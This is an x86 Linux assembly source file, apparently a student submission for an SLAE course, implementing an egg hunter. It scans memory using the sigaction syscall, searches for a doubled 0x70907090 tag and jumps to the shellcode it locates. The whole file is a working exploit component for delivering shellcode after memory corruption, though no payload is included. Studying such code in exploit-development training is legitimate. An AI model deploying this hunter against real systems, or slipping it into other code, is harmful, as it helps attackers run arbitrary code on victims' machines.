; SLAE - Assignment #3: Egg Hunter (Linux/x86) 
; Author:  Dipsy 
; Student ID: SLAE-1535
global _start
section .text
_start:
      goto_next_page:
      or cx,0xfff            ; set cx to 4095
      
      goto_next_address:
      inc ecx   ; increment to 4096
      
      mov bl, 0x31  ;dummy signal number
      
      sub eax, eax 
      mov al, 0x43 
      int 0x80                ; execute sigaction()
      
      cmp eax,0xfffffff2      ; check for EFAULT
      jz goto_next_page       ; if EFAULT jump to next page in memory
      
      mov eax, 0x70907090     ; move tag to EAX
      mov edi, ecx            ; move address to be checked by scasd
      scasd                   ; is eax == edi? if so edi is incremented by 4 bytes
      
      jnz goto_next_address   ; if not try with the next address
      scasd                   ; check for second half of EGG
      
      jnz goto_next_address   ; if not try with next address
      jmp edi                 ; if EGG is found again, jmp to shellcode
